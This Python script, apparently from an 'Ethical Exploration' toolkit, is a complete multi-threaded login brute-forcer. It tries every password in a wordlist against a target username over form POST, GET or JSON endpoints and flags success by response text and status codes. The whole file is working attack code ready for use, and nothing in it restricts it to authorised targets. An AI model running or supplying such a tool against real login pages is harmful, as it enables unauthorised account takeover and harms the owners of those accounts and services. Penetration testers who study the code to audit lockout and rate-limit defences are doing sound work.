#!/usr/bin/env python3
"""
Ethical Exploration - Brute Force Login Tool
License: GNU General Public License v3.0 (GPL-3.0)
Description: Multi-threaded HTTP authentication brute-forcing tool supporting form POST,
             GET, and JSON login endpoints with customizable success/failure signatures.
"""

import argparse
import os
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.parse
    import urllib.error
    HAS_REQUESTS = False

found_event = threading.Event()
found_credentials = []


def make_request(url, username, password, user_field, pass_field, method, is_json, timeout, headers):
    """Executes a single login attempt."""
    if is_json:
        payload = {user_field: username, pass_field: password}
    else:
        payload = {user_field: username, pass_field: password}

    if HAS_REQUESTS:
        session = requests.Session()
        req_headers = {"User-Agent": "EthicalExploration-BruteForcer/1.0"}
        if headers:
            req_headers.update(headers)

        if method == "POST":
            if is_json:
                res = session.post(url, json=payload, headers=req_headers, timeout=timeout, allow_redirects=True)
            else:
                res = session.post(url, data=payload, headers=req_headers, timeout=timeout, allow_redirects=True)
        else:
            res = session.get(url, params=payload, headers=req_headers, timeout=timeout, allow_redirects=True)
        return res.status_code, res.text, res.url
    else:
        req_headers = {"User-Agent": "EthicalExploration-BruteForcer/1.0"}
        if headers:
            req_headers.update(headers)

        if method == "POST":
            if is_json:
                import json
                data_bytes = json.dumps(payload).encode("utf-8")
                req_headers["Content-Type"] = "application/json"
            else:
                data_bytes = urllib.parse.urlencode(payload).encode("utf-8")
            req = urllib.request.Request(url, data=data_bytes, headers=req_headers, method="POST")
        else:
            encoded_params = urllib.parse.urlencode(payload)
            sep = "&" if "?" in url else "?"
            full_url = f"{url}{sep}{encoded_params}"
            req = urllib.request.Request(full_url, headers=req_headers, method="GET")

        try:
            with urllib.request.urlopen(req, timeout=timeout) as response:
                body = response.read().decode("utf-8", errors="ignore")
                return response.status, body, response.geturl()
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="ignore")
            return e.code, body, e.geturl()


def test_login(url, username, password, user_field, pass_field, success_str, failure_str, method, is_json, timeout, headers):
    """Evaluates whether an authentication attempt succeeded."""
    if found_event.is_set():
        return None

    try:
        status_code, body, final_url = make_request(
            url, username, password, user_field, pass_field, method, is_json, timeout, headers
        )

        success = False
        body_lower = body.lower()

        if success_str:
            if success_str.lower() in body_lower:
                success = True
        elif failure_str:
            if failure_str.lower() not in body_lower and status_code not in (401, 403):
                success = True
        else:
            # Default heuristic: check common success strings or 200/302 redirects
            if any(k in body_lower for k in ["dashboard", "welcome", "logged in", "login successful", "my account"]):
                success = True
            elif status_code in (200, 302) and "invalid" not in body_lower and "incorrect" not in body_lower:
                if status_code == 302:
                    success = True

        if success:
            found_event.set()
            found_credentials.append((username, password))
            print(f"\n[+] SUCCESS! Username: '{username}' | Password: '{password}' (Status: {status_code})")
            return password
        else:
            print(f"[-] Attempt failed: {username}:{password} (Status: {status_code})", end="\r", flush=True)

    except Exception as e:
        print(f"[!] Error testing {username}:{password} - {e}", file=sys.stderr)

    return None


def brute_force_login(url, username, password_list, user_field="username", pass_field="password",
                      success_str=None, failure_str=None, threads=5, timeout=7,
                      method="POST", is_json=False, headers=None):
    """Orchestrates multi-threaded brute-forcing of login endpoint."""
    print(f"[*] Target URL : {url}")
    print(f"[*] Username   : {username}")
    print(f"[*] Wordlist   : {password_list}")
    print(f"[*] Threads    : {threads}")
    print(f"[*] Method     : {method} ({'JSON' if is_json else 'Form-Encoded'})")
    print("-" * 50)

    if not os.path.isfile(password_list):
        print(f"[!] Error: Wordlist file '{password_list}' not found.", file=sys.stderr)
        return None

    with open(password_list, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords. Starting attack...")

    found_event.clear()
    del found_credentials[:]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(
                test_login, url, username, pwd, user_field, pass_field,
                success_str, failure_str, method, is_json, timeout, headers
            )
            for pwd in passwords
        ]
        for future in as_completed(futures):
            res = future.result()
            if res or found_event.is_set():
                break

    print()
    if found_credentials:
        u, p = found_credentials[0]
        print("=" * 50)
        print(f"[+] BRUTE FORCE SUCCESSFUL: {u}:{p}")
        print("=" * 50)
        return p
    else:
        print("[-] Brute force completed. No matching credentials found.")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Ethical Exploration - Multi-Threaded HTTP Login Brute-Forcer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 BruteForceLogin.py -u https://example.com/login -U admin -P sample_wordlists/passwords.txt
  python3 BruteForceLogin.py -u https://example.com/api/login -U admin -P passwords.txt --json --success-str "token"
"""
    )
    parser.add_argument("-u", "--url", default="https://example.com/login", help="Target login URL")
    parser.add_argument("-U", "--username", default="admin", help="Target username")
    parser.add_argument("-P", "--password-list", default="sample_wordlists/passwords.txt", help="Path to password wordlist file")
    parser.add_argument("--user-field", default="username", help="Form field name for username (default: username)")
    parser.add_argument("--pass-field", default="password", help="Form field name for password (default: password)")
    parser.add_argument("-s", "--success-str", help="Substring indicating successful login")
    parser.add_argument("-f", "--failure-str", help="Substring indicating failed login")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent worker threads (default: 5)")
    parser.add_argument("--timeout", type=int, default=7, help="Request timeout in seconds (default: 7)")
    parser.add_argument("-m", "--method", choices=["POST", "GET"], default="POST", help="HTTP Method (default: POST)")
    parser.add_argument("--json", action="store_true", help="Send payload as application/json instead of form-encoded")

    args = parser.parse_args()

    brute_force_login(
        url=args.url,
        username=args.username,
        password_list=args.password_list,
        user_field=args.user_field,
        pass_field=args.pass_field,
        success_str=args.success_str,
        failure_str=args.failure_str,
        threads=args.threads,
        timeout=args.timeout,
        method=args.method,
        is_json=args.json
    )


if __name__ == "__main__":
    main()
